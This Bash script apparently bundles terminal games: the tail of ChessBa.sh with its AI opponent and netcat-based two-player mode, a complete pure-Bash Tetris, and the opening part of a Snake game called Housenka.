	if (( ++hoverX > 7 )) ; then
		hoverX=7
		bell
	fi ;;
	'[D' | 'OD' )
		hoverInit=true
	if (( --hoverX < 0 )) ; then
		hoverX=0
		bell
	fi ;;
	'[3' )
		ret=1
		bell
	break ;;
	'[5' )
		hoverInit=true
	if (( hoverY == 0 )) ; then
		bell
	else
		hoverY=0
	fi ;;
	'[6' )
		hoverInit=true
	if (( hoverY == 7 )) ; then
		bell
	else
		hoverY=7
	fi ;;
	'OH' )
		hoverInit=true
	if (( hoverX == 0 )) ; then
		bell
	else
		hoverX=0
	fi ;;
	'OF' )
		hoverInit=true
	if (( hoverX == 7 )) ; then
		bell
	else
		hoverX=7
	fi ;;
	'[M' )
		read -sN1 t
		read -sN1 tx
		read -sN1 ty
		ty=$(( $(ord "$ty") - 32 - originY ))
	if $ascii ; then
		tx=$(( ( $(ord "$tx") - 32 - originX) / 3 ))
	else
		tx=$(( ( $(ord "$tx") - 32 - originX) / 2 ))
	fi
	if (( tx >= 0 && tx < 8 && ty >= 0 && ty < 8 )) ; then
		inputY=$ty
		inputX=$tx
		hoverY=$ty
		hoverX=$tx
	else
		ret=1
		bell
	break
	fi ;;
	* )
		bell
	esac
	else
		ret=1
		bell
	break
	fi ;;
	$'\t' | $'\n' | ' ' )
		if $hoverInit ; then
		inputY=$hoverY
		inputX=$hoverX
	fi ;;
	'~' ) ;;
	$'\x7f' | $'\b' )
		ret=1
		bell
	break ;;
	[A-Ha-h] )
		t=$(ord $a)
	if (( t < 90 )) ; then
		inputY=$(( 72 - $(ord $a) ))
	else
		inputY=$(( 104 - $(ord $a) ))
	fi
		hoverY=$inputY ;;
	[1-8] )
		inputX=$(( a - 1 ))
		hoverX=$inputX ;;
	*)
		bell ;;
	esac
	if $hoverInit && (( oldHoverX != hoverX || oldHoverY != hoverY )) ; then
		oldHoverX=$hoverX
		oldHoverY=$hoverY
		draw
	fi
	done
if $mouse ; then
	echo -en "\e[?9l"
fi
	$useStty && stty -echo
return $ret
}
# Player input
# (reads a valid user movement)
# Params
# 	$1	current (user) player
# Returns status code 0
function input() {
local player=$1
SECONDS=0
message="\e[1m$(namePlayer "$player")\e[0m: Move your figure"
while true ; do
	selectedY=-1
	selectedX=-1
	title="It's $(namePlayer "$player")s turn"
	draw >&3
if inputCoord ; then
	selectedY=$inputY
	selectedX=$inputX
if (( ${field["$selectedY,$selectedX"]} == 0 )) ; then
	warn "You cannot choose an empty field!" >&3
elif (( ${field["$selectedY,$selectedX"]} * player  < 0 )) ; then
	warn "You cannot choose your enemies figures!" >&3
else
	send "$player" "$selectedY" "$selectedX"
	local figName=$(nameFigure ${field[$selectedY,$selectedX]} )
	message="\e[1m$(namePlayer "$player")\e[0m: Move your \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to"
	draw >&3
if inputCoord ; then
	selectedNewY=$inputY
	selectedNewX=$inputX
if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
	warn "You didn't move..." >&3
elif (( ${field[$selectedNewY,$selectedNewX]} * $player > 0 )) ; then
	warn "You cannot kill your own figures!" >&3
elif move "$player" ; then
	title="$(namePlayer "$player") moved the \e[3m$figName\e[0m from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX") \e[2m(took him $SECONDS seconds)\e[0m"
	send "$player" "$selectedNewY" "$selectedNewX"
return 0
else
	warn "This move is not allowed!" >&3
fi
# Same position again --> revoke
	send "$player" "$selectedY" "$selectedX"
fi
fi
fi
done
}
# AI interaction
# (calculating movement)
# Params
# 	$1	current (ai) player
# Verbose movement messages to stdout
function ai() {
local player=$1
local val
SECONDS=0
title="It's $(namePlayer "$player")s turn"
message="Computer player \e[1m$(namePlayer "$player")\e[0m is thinking..."
draw >&3
negamax "$strength" 0 255 "$player" true
val=$?
local figName
figName=$(nameFigure ${field[$selectedY,$selectedX]} )
message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX")..."
draw >&3
send "$player" "$selectedY" "$selectedX"
sleep "$sleep"
if move $player ; then
	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX")"
	draw >&3
	send "$player" "$selectedNewY" "$selectedNewX"
	sleep "$sleep"
	title="$( namePlayer "$player" ) moved the $figName from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX" ) (took him $SECONDS seconds)."
else
	error "AI produced invalid move - that should not hapen!"
fi
}
# Read row from remote
# Returns row (0-7) as status code
function receiveY() {
local i
while true; do
read -n 1 i
case $i in
	[hH] ) return 0 ;;
	[gG] ) return 1 ;;
	[fF] ) return 2 ;;
	[eE] ) return 3 ;;
	[dD] ) return 4 ;;
	[cC] ) return 5 ;;
	[bB] ) return 6 ;;
	[aA] ) return 7 ;;
	* )
	if $warnings ; then
		warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
	fi
esac
done
}
# Read column from remote
# Returns column (0-7) as status code
function receiveX() {
	local i
while true; do
read -n 1 i
case $i in
	[1-8] ) return $(( i - 1 )) ;;
	* )
	if $warnings ; then
		warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
	fi
esac
done
}
# receive movement from connected player
# (no params/return value)
function receive() {
local player=$remote
SECONDS=0
title="It's $(namePlayer "$player")s turn"
message="Network player \e[1m$(namePlayer "$player")\e[0m is thinking... (or sleeping?)"
draw >&3
while true ; do
	receiveY
	selectedY=$?
	receiveX
	selectedX=$?
	local figName
	figName=$(nameFigure ${field[$selectedY,$selectedX]} )
	message"\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX)..."
	draw >&3
	receiveY
	selectedNewY=$?
	receiveX
	selectedNewX=$?
	if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
		selectedY=-1
		selectedX=-1
		selectedNewY=-1
		selectedNewX=-1
		message="\e[1m$( namePlayer "$player" )\e[0m revoked his move... okay, that'll be time consuming"
		draw >&3
	else
		break
	fi
done
if move $player ; then
	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX)"
	draw >&3
	sleep "$sleep"
	title="$( namePlayer $player ) moved the $figName from $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX) (took him $SECONDS seconds)."
else
	error "Received invalid move from network - that should not hapen!"
fi
}
# Write coordinates to network
# Params:
#	$1	player
#	$2	row
#	$3	column
# (no return value/exit code)
function send() {
local player=$1
local y=$2
local x=$3
if (( remote == player * (-1) )) ; then
	sleep "$remotedelay"
	coord "$y" "$x"
	echo
	sleep "$remotedelay"
fi
}
# Import transposition tables
# by reading serialised cache from stdin
# (no params / return value)
function importCache() {
	while IFS=$'\t' read hash lookup depth flag ; do
		cacheLookup["$hash"]=$lookup
		cacheDepth["$hash"]=$depth
		cacheFlag["$hash"]=$flag
	done
}
# Export transposition tables
# Outputs serialised cache (to stdout)
# (no params / return value)
function exportCache() {
for hash in "${!cacheLookup[@]}" ; do
	echo -e "$hash\t${cacheLookup[$hash]}\t${cacheDepth[$hash]}\t${cacheFlag[$hash]}"
done
}
# Trap function for exporting cache
# (no params / return value)
function exitCache() {
# permanent cache: export
if [[ -n "$cache" ]] ; then
	echo -en "\r\n\e[2mExporting cache..." >&3
	if $cachecompress ; then
		exportCache | gzip > "$cache"
	else
		exportCache > "$cache"
	fi
	echo -e " done!\e[0m" >&3
fi
}
# Perform necessary tasks for exit
# like deleting files and measuring runtime
# (no params / return value)
function end() {
# remove pipe
	if [[ -n "$fifopipe" && -p "$fifopipe" ]] ; then
		rm "$fifopipe"
	fi
# disable mouse
	if $mouse ; then
		echo -en "\e[?9l"
	fi
# enable input
	stty echo
# restore screen
	if $cursor ; then
		echo -en "\e[2J\e[?47l\e[?25h\e[u\e8"
	fi
# exit message
	duration=$(( $( date +%s%N ) - timestamp ))
	seconds=$(( duration / 1000000000 ))
	echo -e "\r\n\e[2mYou've wasted $seconds,$(( duration -( seconds * 1000000000 ))) seconds of your lifetime playing with a Bash script.\e[0m\n"
}
# Exit trap
trap "end" 0
# setting up requirements for network
piper="cat"
fifopipe="/dev/fd/1"
initializedGameLoop=true
if (( remote != 0 )) ; then
	require nc
	require mknod
	initializedGameLoop=false
	if (( remote == 1 )) ; then
		fifopipe="$fifopipeprefix.server"
		piper="nc -l $port"
	else
		fifopipe="$fifopipeprefix.client"
		piper="nc $remoteip $port"
		echo -e "\e[1mWait!\e[0mPlease make sure the Host (the other Player) has started before continuing.\e[0m"
		anyKey
	fi
	if [[ ! -e "$fifopipe" ]] ; then
		mkfifo "$fifopipe"
	fi
	if [[ ! -p "$fifopipe" ]] ; then
		echo "Could not create FIFO pipe '$fifopipe'!" >&2
	fi
fi

# print welcome title
title="Welcome to ChessBa.sh"
if isAI "1" || isAI "-1" ; then
	title="$title - your room heater tool!"
fi

# permanent cache: import
if [[ -n "$cache" && -f "$cache" ]] ; then
	echo -en "\n\n\e[2mImporting cache..."
	if $cachecompress ; then
		importCache < <( zcat "$cache" )
	else
		importCache < "$cache"
	fi
	echo -e " done\e[0m"
fi
# main game loop
{
	p=1
	while true ; do
# initialize remote connection on first run
	if ! $initializedGameLoop ; then
# set cache export trap
	trap "exitCache" 0
	warn "Waiting for the other network player to be ready..." >&3
# exchange names
	if (( remote == -1 )) ; then
		read namePlayerA < $fifopipe
		echo "$namePlayerB"
		echo "connected with first player." >&3
	elif (( remote == 1 )) ; then
		echo "$namePlayerA"
		read namePlayerB < $fifopipe
		echo "connected with second player." >&3
	fi
# set this loop initialized
	initializedGameLoop=true
		fi
# reset global variables
	selectedY=-1
	selectedX=-1
	selectedNewY=-1
	selectedNewX=-1
# switch current player
	(( p *= (-1) ))
# check check (or: if the king is lost)
	if hasKing "$p" ; then
		if (( remote == p )) ; then
			receive < $fifopipe
		elif isAI "$p" ; then
			if (( computer-- == 0 )) ; then
			echo "Stopping - performed all ai steps" >&3
		exit 0
			fi
			ai "$p"
		else
			input "$p"
		fi
	else
		title="Game Over!"
		message="\e[1m$(namePlayer $(( p * (-1) )) ) wins the game!\e[1m\n"
		draw >&3
		anyKey
		exit 0
	fi
done | $piper > "$fifopipe"
# check exit code
	netcatExit=$?
	gameLoopExit=${PIPESTATUS[0]}
	if (( netcatExit != 0 )) ; then
		error "Network failure!"
	elif (( gameLoopExit != 0 )) ; then
		error "The game ended unexpected!"
	fi
} 3>&1
}
##
#   - Pass time tetris
##
tetris_game() {
# Tetris game written in pure bash
#
# I tried to mimic as close as possible original tetris game
# which was implemented on old soviet DVK computers (PDP-11 clones)
#
# Videos of this tetris can be found here:
#
# http://www.youtube.com/watch?v=O0gAgQQHFcQ
# http://www.youtube.com/watch?v=iIQc1F3UuV4
#
# This script was created on ubuntu 13.04 x64 and bash 4.2.45(1)-release.
# It was not tested on other unix like operating systems.
#
# Enjoy :-)!
#
# Author: Kirill Timofeev <kt97679@gmail.com>
set -u # non initialized variable is an error
# 2 signals are used: SIGUSR1 to decrease delay after level up and SIGUSR2 to quit
# they are sent to all instances of this script
# because of that we should process them in each instance
# in this instance we are ignoring both signals
trap '' SIGUSR1 SIGUSR2
# Those are commands sent to controller by key press processing code
# In controller they are used as index to retrieve actual functuon from array
QUIT=0
RIGHT=1
LEFT=2
ROTATE=3
DOWN=4
DROP=5
TOGGLE_HELP=6
TOGGLE_NEXT=7
TOGGLE_COLOR=8
DELAY=1          # initial delay between piece movements
DELAY_FACTOR=0.8 # this value controld delay decrease for each level up
# color codes
RED=1
GREEN=2
YELLOW=3
BLUE=4
FUCHSIA=5
CYAN=6
WHITE=7
# Location and size of playfield, color of border
PLAYFIELD_W=10
PLAYFIELD_H=20
PLAYFIELD_X=30
PLAYFIELD_Y=1
BORDER_COLOR=$YELLOW
# Location and color of score information
SCORE_X=1
SCORE_Y=2
SCORE_COLOR=$GREEN
# Location and color of help information
HELP_X=58
HELP_Y=1
HELP_COLOR=$CYAN
# Next piece location
NEXT_X=14
NEXT_Y=11
# Location of "game over" in the end of the game
GAMEOVER_X=1
GAMEOVER_Y=$((PLAYFIELD_H + 3))
# Intervals after which game level (and game speed) is increased 
LEVEL_UP=20
colors=($RED $GREEN $YELLOW $BLUE $FUCHSIA $CYAN $WHITE)
no_color=true    # do we use color or not
showtime=true    # controller runs while this flag is true
empty_cell=" ."  # how we draw empty cell
filled_cell="[]" # how we draw filled cell
score=0           # score variable initialization
level=1           # level variable initialization
lines_completed=0 # completed lines counter initialization
# screen_buffer is variable, that accumulates all screen changes
# this variable is printed in controller once per game cycle
puts() {
	screen_buffer+=${1}
}
# move cursor to (x,y) and print string
# (1,1) is upper left corner of the screen
xyprint() {
	puts "\033[${2};${1}H${3}"
}
show_cursor() {
	echo -ne "\033[?25h"
}
hide_cursor() {
	echo -ne "\033[?25l"
}
# foreground color
set_fg() {
	$no_color && return
	puts "\033[3${1}m"
}
# background color
set_bg() {
	$no_color && return
	puts "\033[4${1}m"
}
reset_colors() {
	puts "\033[0m"
}
set_bold() {
	puts "\033[1m"
}
# playfield is 1-dimensional array, data is stored as follows:
# [ a11, a21, ... aX1, a12, a22, ... aX2, ... a1Y, a2Y, ... aXY]
#   |<  1st line   >|  |<  2nd line   >|  ... |<  last line  >|
# X is PLAYFIELD_W, Y is PLAYFIELD_H
# each array element contains cell color value or -1 if cell is empty
redraw_playfield() {
	local j i x y xp yp
	((xp = PLAYFIELD_X))
	for ((y = 0; y < PLAYFIELD_H; y++)) {
		((yp = y + PLAYFIELD_Y))
		((i = y * PLAYFIELD_W))
		xyprint $xp $yp ""
		for ((x = 0; x < PLAYFIELD_W; x++)) {
		((j = i + x))
		if ((${play_field[$j]} == -1)) ; then
		puts "$empty_cell"
		else
		set_fg ${play_field[$j]}
		set_bg ${play_field[$j]}
		puts "$filled_cell"
		reset_colors
		fi
		}
	}
}
update_score() {
# Arguments: 1 - number of completed lines
	((lines_completed += $1))
# Unfortunately I don't know scoring algorithm of original tetris
# Here score is incremented with squared number of lines completed
# this seems reasonable since it takes more efforts to complete several lines at once
	((score += ($1 * $1)))
	if (( score > LEVEL_UP * level)) ; then          # if level should be increased
		((level++))                                  # increment level
		pkill -SIGUSR1 -f "/bin/bash $0" # and send SIGUSR1 signal to all instances of this script (please see ticker for more details)
	fi
	set_bold
	set_fg $SCORE_COLOR
	xyprint $SCORE_X $SCORE_Y         "Lines completed: $lines_completed"
	xyprint $SCORE_X $((SCORE_Y + 1)) "Level:           $level"
	xyprint $SCORE_X $((SCORE_Y + 2)) "Score:           $score"
	reset_colors
}
help=(
"  Use cursor keys"
"       or"
"      s: up"
"a: left,  d: right"
"    space: drop"
"      q: quit"
"  c: toggle color"
"n: toggle show next"
"h: toggle this help"
)
help_on=-1 # if this flag is 1 help is shown
toggle_help() {
	local i s
	set_bold
	set_fg $HELP_COLOR
	for ((i = 0; i < ${#help[@]}; i++ )) {
		# ternary assignment: if help_on is 1 use string as is, otherwise substitute all characters with spaces
		((help_on == 1)) && s="${help[i]}" || s="${help[i]//?/ }"
		xyprint $HELP_X $((HELP_Y + i)) "$s"
}
	((help_on = -help_on))
	reset_colors
}
# this array holds all possible pieces that can be used in the game
# each piece consists of 4 cells
# each string is sequence of relative xy coordinates for different orientations
# depending on piece symmetry there can be 1, 2 or 4 orientations
piece=(
"00011011"                         # square piece
"0212223210111213"                 # line piece
"0001111201101120"                 # S piece
"0102101100101121"                 # Z piece
"01021121101112220111202100101112" # L piece
"01112122101112200001112102101112" # inverted L piece
"01111221101112210110112101101112" # T piece
)
draw_piece() {
# Arguments:
# 1 - x, 2 - y, 3 - type, 4 - rotation, 5 - cell content
	local i x y
# loop through piece cells: 4 cells, each has 2 coordinates
	for ((i = 0; i < 8; i += 2)) {
# relative coordinates are retrieved based on orientation and added to absolute coordinates
		((x = $1 + ${piece[$3]:$((i + $4 * 8 + 1)):1} * 2))
		((y = $2 + ${piece[$3]:$((i + $4 * 8)):1}))
		xyprint $x $y "$5"
}
}
next_piece=0
next_piece_rotation=0
next_piece_color=0
next_on=1 # if this flag is 1 next piece is shown
draw_next() {
# Arguments: 1 - string to draw single cell
	((next_on == -1)) && return
	draw_piece $NEXT_X $NEXT_Y $next_piece $next_piece_rotation "$1"
}
clear_next() {
	draw_next "${filled_cell//?/ }"
}
show_next() {
	set_fg $next_piece_color
	set_bg $next_piece_color
	draw_next "${filled_cell}"
	reset_colors
}
toggle_next() {
	case $next_on in
		1) clear_next; next_on=-1 ;;
		-1) next_on=1; show_next ;;
	esac
}
draw_current() {
# Arguments: 1 - string to draw single cell
# factor 2 for x because each cell is 2 characters wide
	draw_piece $((current_piece_x * 2 + PLAYFIELD_X)) $((current_piece_y + PLAYFIELD_Y)) $current_piece $current_piece_rotation "$1"
}
show_current() {
	set_fg $current_piece_color
	set_bg $current_piece_color
	draw_current "${filled_cell}"
	reset_colors
}
clear_current() {
	draw_current "${empty_cell}"
}
new_piece_location_ok() {
# Arguments: 1 - new x coordinate of the piece, 2 - new y coordinate of the piece
# test if piece can be moved to new location
	local j i x y x_test=$1 y_test=$2
	for ((j = 0, i = 1; j < 8; j += 2, i = j + 1)) {
		((y = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + y_test)) # new y coordinate of piece cell
		((x = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + x_test)) # new x coordinate of piece cell
		((y < 0 || y >= PLAYFIELD_H || x < 0 || x >= PLAYFIELD_W )) && return 1         # check if we are out of the play field
		((${play_field[y * PLAYFIELD_W + x]} != -1 )) && return 1                       # check if location is already ocupied
}
	return 0
}
get_random_next() {
# next piece becomes current
	current_piece=$next_piece
	current_piece_rotation=$next_piece_rotation
	current_piece_color=$next_piece_color
# place current at the top of play field, approximately at the center
	((current_piece_x = (PLAYFIELD_W - 4) / 2))
	((current_piece_y = 0))
# check if piece can be placed at this location, if not - game over
	new_piece_location_ok $current_piece_x $current_piece_y || cmd_quit
	show_current
	clear_next
# now let's get next piece
	((next_piece = RANDOM % ${#piece[@]}))
	((next_piece_rotation = RANDOM % (${#piece[$next_piece]} / 8)))
	((next_piece_color = RANDOM % ${#colors[@]}))
	show_next
}
draw_border() {
	local i x1 x2 y
	set_bold
	set_fg $BORDER_COLOR
	((x1 = PLAYFIELD_X - 2))               # 2 here is because border is 2 characters thick
	((x2 = PLAYFIELD_X + PLAYFIELD_W * 2)) # 2 here is because each cell on play field is 2 characters wide
	for ((i = 0; i < PLAYFIELD_H + 1; i++)) {
		((y = i + PLAYFIELD_Y))
		xyprint $x1 $y "<|"
		xyprint $x2 $y "|>"
}
	((y = PLAYFIELD_Y + PLAYFIELD_H))
	for ((i = 0; i < PLAYFIELD_W; i++)) {
		((x1 = i * 2 + PLAYFIELD_X)) # 2 here is because each cell on play field is 2 characters wide
		xyprint $x1 $y '=='
		xyprint $x1 $((y + 1)) "\/"
}
	reset_colors
}
toggle_color() {
	$no_color && no_color=false || no_color=true
	show_next
	update_score 0
	toggle_help
	toggle_help
	draw_border
	redraw_playfield
	show_current
}
init() {
	local i x1 x2 y
# playfield is initialized with -1s (empty cells)
	for ((i = 0; i < PLAYFIELD_H * PLAYFIELD_W; i++)) {
	play_field[$i]=-1
}
	clear
	hide_cursor
	get_random_next
	get_random_next
	toggle_color
}
# this function runs in separate process
# it sends DOWN commands to controller with appropriate delay
ticker() {
# on SIGUSR2 this process should exit
	trap exit SIGUSR2
# on SIGUSR1 delay should be decreased, this happens during level ups
	trap 'DELAY=$(awk "BEGIN {print $DELAY * $DELAY_FACTOR}")' SIGUSR1
	while true ; do echo -n $DOWN; sleep $DELAY; done
}
# this function processes keyboard input
reader() {
	trap exit SIGUSR2 # this process exits on SIGUSR2
	trap '' SIGUSR1   # SIGUSR1 is ignored
	local -u key a='' b='' cmd esc_ch=$'\x1b'
# commands is associative array, which maps pressed keys to commands, sent to controller
	declare -A commands=([A]=$ROTATE [C]=$RIGHT [D]=$LEFT
		[_S]=$ROTATE [_A]=$LEFT [_D]=$RIGHT
		[_]=$DROP [_Q]=$QUIT [_H]=$TOGGLE_HELP [_N]=$TOGGLE_NEXT [_C]=$TOGGLE_COLOR)
	while read -s -n 1 key ; do
		case "$a$b$key" in
			"${esc_ch}["[ACD]) cmd=${commands[$key]} ;; # cursor key
			*${esc_ch}${esc_ch}) cmd=$QUIT ;;           # exit on 2 escapes
			*) cmd=${commands[_$key]:-} ;;              # regular key. If space was pressed $key is empty
		esac
		a=$b   # preserve previous keys
		b=$key
		[ -n "$cmd" ] && echo -n "$cmd"
	done
}
# this function updates occupied cells in play_field array after piece is dropped
flatten_playfield() {
	local i j k x y
	for ((i = 0, j = 1; i < 8; i += 2, j += 2)) {
		((y = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + current_piece_y))
		((x = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + current_piece_x))
		((k = y * PLAYFIELD_W + x))
		play_field[$k]=$current_piece_color
}
}
# this function goes through play_field array and eliminates lines without empty sells
process_complete_lines() {
	local j i complete_lines
	((complete_lines = 0))
	for ((j = 0; j < PLAYFIELD_W * PLAYFIELD_H; j += PLAYFIELD_W)) {
	for ((i = j + PLAYFIELD_W - 1; i >= j; i--)) {
		((${play_field[$i]} == -1)) && break # empty cell found
}
		((i >= j)) && continue # previous loop was interrupted because empty cell was found
		((complete_lines++))
# move lines down
		for ((i = j - 1; i >= 0; i--)) {
		play_field[$((i + PLAYFIELD_W))]=${play_field[$i]}
}
# mark cells as free
		for ((i = 0; i < PLAYFIELD_W; i++)) {
		play_field[$i]=-1
 }
}
	return $complete_lines
}
process_fallen_piece() {
	flatten_playfield
	process_complete_lines && return
	update_score $?
	redraw_playfield
}
move_piece() {
# arguments: 1 - new x coordinate, 2 - new y coordinate
# moves the piece to the new location if possible
	if new_piece_location_ok $1 $2 ; then # if new location is ok
		clear_current                     # let's wipe out piece current location
		current_piece_x=$1                # update x ...
		current_piece_y=$2                # ... and y of new location
		show_current                      # and draw piece in new location
		return 0                          # nothing more to do here
	fi                                    # if we could not move piece to new location
	(($2 == current_piece_y)) && return 0 # and this was not horizontal move
	process_fallen_piece                  # let's finalize this piece
	get_random_next                       # and start the new one
	return 1
}
cmd_right() {
	move_piece $((current_piece_x + 1)) $current_piece_y
}
cmd_left() {
	move_piece $((current_piece_x - 1)) $current_piece_y
}
cmd_rotate() {
	local available_rotations old_rotation new_rotation
	available_rotations=$((${#piece[$current_piece]} / 8))            # number of orientations for this piece
	old_rotation=$current_piece_rotation                              # preserve current orientation
	new_rotation=$(((old_rotation + 1) % available_rotations))        # calculate new orientation
	current_piece_rotation=$new_rotation                              # set orientation to new
	if new_piece_location_ok $current_piece_x $current_piece_y ; then # check if new orientation is ok
	current_piece_rotation=$old_rotation                          # if yes - restore old orientation
	clear_current                                                 # clear piece image
	current_piece_rotation=$new_rotation                          # set new orientation
	show_current                                                  # draw piece with new orientation
	else                                                              # if new orientation is not ok
		current_piece_rotation=$old_rotation                          # restore old orientation
	fi
}
cmd_down() {
	move_piece $current_piece_x $((current_piece_y + 1))
}
cmd_drop() {
# move piece all way down
# this is example of do..while loop in bash
# loop body is empty
# loop condition is done at least once
# loop runs until loop condition would return non zero exit code
	while move_piece $current_piece_x $((current_piece_y + 1)) ; do : ; done
}
cmd_quit() {
	showtime=false                               # let's stop controller ...
	pkill -SIGUSR2 -f "/bin/bash $0" # ... send SIGUSR2 to all script instances to stop forked processes ...
	xyprint $GAMEOVER_X $GAMEOVER_Y "Game over!"
	echo -e "$screen_buffer"                     # ... and print final message
}
controller() {
# SIGUSR1 and SIGUSR2 are ignored
	trap '' SIGUSR1 SIGUSR2
	local cmd commands
# initialization of commands array with appropriate functions
	commands[$QUIT]=cmd_quit
	commands[$RIGHT]=cmd_right
	commands[$LEFT]=cmd_left
	commands[$ROTATE]=cmd_rotate
	commands[$DOWN]=cmd_down
	commands[$DROP]=cmd_drop
	commands[$TOGGLE_HELP]=toggle_help
	commands[$TOGGLE_NEXT]=toggle_next
	commands[$TOGGLE_COLOR]=toggle_color
	init
	while $showtime; do           # run while showtime variable is true, it is changed to false in cmd_quit function
	echo -ne "$screen_buffer" # output screen buffer ...
	screen_buffer=""          # ... and reset it
	read -s -n 1 cmd          # read next command from stdout
	${commands[$cmd]}         # run command
	done
}
stty_g=`stty -g` # let's save terminal state
# output of ticker and reader is joined and piped into controller
(
	ticker & # ticker runs as separate process
	reader
)|(
	controller
)
show_cursor
stty $stty_g # let's restore terminal state
}
##
#   - Pass time Snake
##
snake_game() {
##############################################################################
#                                                                            #
#   Author : Martin "BruXy" Bruchanov, bruxy at regnet.cz                    #
#   URL    : http://bruxy.regnet.cz                                          #
#   Version: 1.01 (Wed Jan  9 20:04:26 CET 2013)                             #
#                                                                            #
##############################################################################
MW=$(tput cols)
MH=$(tput lines)
MH=$[MH-1] # bottom line is used for info and score
CONFIG=~/.housenka
DEFAULT_FOOD_NUMBER=2 # reset after game over in func. new_level
FOOD_NUMBER=0
DEATH=0
SCORE=0
TIMING=0.1            # delay constant, lower value => faster moves
C=2                   # game cycle
declare -A FOOD
_STTY=$(stty -g)      # Save current terminal setup
printf "\e[?25l"      # Turn of cursor 
printf "\e]0;HOUSENKA\007"
stty -echo -icanon
USER=$(whoami)
NAME=$(grep $USER /etc/passwd | cut -d : -f 5)
#############
# ANSI data #
#############
GAME_OVER[0]="\e[1;35m╥┌  ╓─╖ ╥ ╥ ╥─┐ ╥─┐    ╥ ╥ ╥┐  ╥ ┬\e[0m"
GAME_OVER[1]="\e[0;31m╟┴┐ ║ ║ ║\║ ╟┤  ║      ╟─╢ ╟┴┐ ╨╥┘\e[0m"
GAME_OVER[2]="\e[1;31m╨ ┴ ╙─╜ ╨ ╨ ╨─┘ ╨─┘    ╨ ╨ ╨ ┴  ╨ \e[0m"
GAME_OVER[3]="\e[0;32m╥────────────────────────────────╥\e[0m"
GAME_OVER[4]="\e[1;32m║  Stiskni ENTER pro novou hru!  ║\e[0m"
GAME_OVER[5]="\e[1;36m╨────────────────────────────────╨\e[0m"
#############
# FUNCTIONS #
#############
function at_exit() {
	printf "\e[?9l"          # Turn off mouse reading
	printf "\e[?12l\e[?25h"  # Turn on cursor
	stty "$_STTY"            # reinitialize terminal settings
	tput sgr0
	clear
}
function get_first() {
# Return: first index of array
	eval echo \${!$1[@]} | cut -d ' ' -f 1
}
function gen_food() {
	local x y food
	for ((i=0; i<$[2*$FOOD_NUMBER]; i++))
	do
		x=$[RANDOM % (MW-2) + 2]
		y=$[RANDOM % (MH-2) + 2]
		# check if leaf position is unique
	if [ $(echo ${!FOOD[@]} | tr ' ' '\n' | grep -c "^$y;$x$") -gt 0 ]
	then
		: $[i--]
	continue
	fi
	food=$[i & 1] # 0 -- poison, 1 -- leaf
	FOOD["$y;$x"]=$food
	if [ $food -eq 1 ] ; then 
		printf "\e[$y;${x}f\e[1;32m♠\e[0m";
	else
		printf "\e[$y;${x}f\e[1;31m♣\e[0m";
	fi
	done
}
function check_food() {
	local first
	# check what was eaten in garden
	if [ "${FOOD["$HY;$HX"]}" == "1" ] ; then
		unset FOOD["$HY;$HX"]
		: $[FOOD_NUMBER--] $[SCORE++]
		((FOOD_NUMBER==0)) && return 
	elif [ "${FOOD["$HY;$HX"]}" == "0" ] ; then
		DEATH=1
	else
		first=$(get_first HOUSENKA)
		printf "\e[${HOUSENKA[$first]}f "
		unset HOUSENKA[$first]
	fi
	# do not break into wall
	if [ $HY -le 1 ] || [ $HY -ge $MH ] || [ $HX -le 1 ] || [ $HX -ge $MW ] 
	then
		DEATH=2
	fi
	# check if Housenka does not bite herself
	if [ ! -z "$KEY" -a $C -gt 4 ] ; then
		local last
		last=${#HOUSENKA[@]}
		if [ $(echo ${HOUSENKA[@]} | tr ' ' '\n' | \
		head -n $[last-2] | grep -c "^$HY;$HX$") -gt 0 ] ; then
		DEATH=3
		fi
	fi
}
function game_over() {
	trap : ALRM # disable interupt
	printf "\a"
	centered_window 34 ${#GAME_OVER[@]} GAME_OVER 
	if [ $SCORE -gt $TOP_SCORE ] ; then
		echo $SCORE > $CONFIG
		TOP_SCORE=$SCORE
	fi
	read
	DEATH=0 SCORE=0 DEFAULT_FOOD_NUMBER=2
	new_level
}
function centered_window() {
# $1 width $2 height $3 content
	w=$1 h=$2
	x=$[(MW-w)/2]
	y=$[(MH-h)/2]
	ul=$y";"$x
	bl=$[y+h+1]";"$x
	printf "\e[${ul}f┌"; printf '─%.0s' $(eval echo {1..$w}); printf '┐\n'
	for i in $(eval echo {0..$h});
	do 
		printf "\e[$[y+i+1];${x}f│";
		echo -en "$(eval printf \"%s\" \"\${$3[\$i]}\")"
		printf "\e[$[y+i+1];$[x+w+1]f│";
	done
	printf "\e[${bl}f└"; printf '─%.0s' $(eval echo {1..$w}); printf '┘\n'
}
function move() {
	check_food
	if [ $DEATH -gt 0 ] ; then game_over; fi
	if [ $FOOD_NUMBER -eq 0 ] ; then new_level;	fi
	echo -en "\e[$HY;${HX}f\e[1;33;42m☻\e[0m"
	( sleep $TIMING; kill -ALRM $$ ) &
	case "$KEY" in
		A) HY=$[HY-1] ;; # Up
		B) HY=$[HY+1] ;; # Down
		C) HX=$[HX+1] ;; # Right
		D) HX=$[HX-1] ;; # Left
	esac
	HOUSENKA[$C]="$HY;$HX"
	: $[C++]
	game_info
}
function draw_area() {
# draw play area
printf "\e[31m"
local x y o="█"
for ((x=0;x<=$MW;x++))
do
	printf  "\e[1;${x}f$o\e[$MH;${x}f$o"
	sleep 0.005
done
for ((y=0;y<=$MH;y++))
do
	printf "\e[${y};1f$o\e[${y};${MW}f$o"
	sleep 0.01
done
}
